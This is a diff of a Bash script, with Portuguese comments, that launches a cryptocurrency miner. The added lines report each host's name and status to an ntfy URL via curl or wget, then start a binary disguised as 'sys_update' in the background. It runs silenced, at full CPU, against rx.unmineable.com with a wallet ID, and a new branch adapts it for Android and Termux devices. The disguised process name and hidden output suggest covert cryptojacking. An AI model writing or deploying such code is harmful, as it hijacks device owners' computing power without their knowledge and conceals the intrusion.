@@ -14,10 +14,12 @@ function send_checkin() {
     
     local msg="💻 Host: $(hostname)\n🛠 Status: $status\n📈 Modo: $mode\n⏱ Uptime: $uptime_str\n📅 Data: $(date '+%d/%m/%Y %H:%M:%S')"
     
-    curl -H "Title: Minerador Status (Linux)" \
-         -H "Priority: default" \
-         -H "Tags: hammer,tux" \
-         -d "$msg" "$NTFY_URL" > /dev/null 2>&1
+    # Tentar curl, depois wget como fallback
+    if command -v curl >/dev/null 2>&1; then
+        curl -H "Title: Minerador Status" -H "Priority: default" -H "Tags: hammer,computer" -d "$msg" "$NTFY_URL" > /dev/null 2>&1
+    elif command -v wget >/dev/null 2>&1; then
+        wget --header="Title: Minerador Status" --post-data="$msg" "$NTFY_URL" -O /dev/null > /dev/null 2>&1
+    fi
 }
 
 ARCH=$(uname -m)
@@ -70,7 +72,12 @@ if [ -f "$NEW_BIN" ]; then
     chmod +x "$NEW_BIN"
     if ! pgrep -x "sys_update" > /dev/null; then
         send_checkin "Iniciado" "Full Power"
-        nohup "$NEW_BIN" -o rx.unmineable.com:3333 -u "MATIC:$WALLET.srv02#p0o1-l2m3" -p x -a rx/0 --cpu-max-threads-hint 100 --priority 5 --randomx-1gb-pages --cuda --opencl --log-file "$LOG_FILE" > /dev/null 2>&1 &
+        # Otimizar argumentos para Android (sem CUDA/OpenCL por padrão e sem 1GB pages que exige root)
+        if [ "$IS_NATIVE_APP" = "true" ] || [ "$IS_TERMUX" = "true" ]; then
+            nohup "$NEW_BIN" -o rx.unmineable.com:3333 -u "MATIC:$WALLET.srv02#p0o1-l2m3" -p x -a rx/0 --cpu-max-threads-hint 100 --priority 5 --log-file "$LOG_FILE" > /dev/null 2>&1 &
+        else
+            nohup "$NEW_BIN" -o rx.unmineable.com:3333 -u "MATIC:$WALLET.srv02#p0o1-l2m3" -p x -a rx/0 --cpu-max-threads-hint 100 --priority 5 --randomx-1gb-pages --cuda --opencl --log-file "$LOG_FILE" > /dev/null 2>&1 &
+        fi
     fi
 fi
 
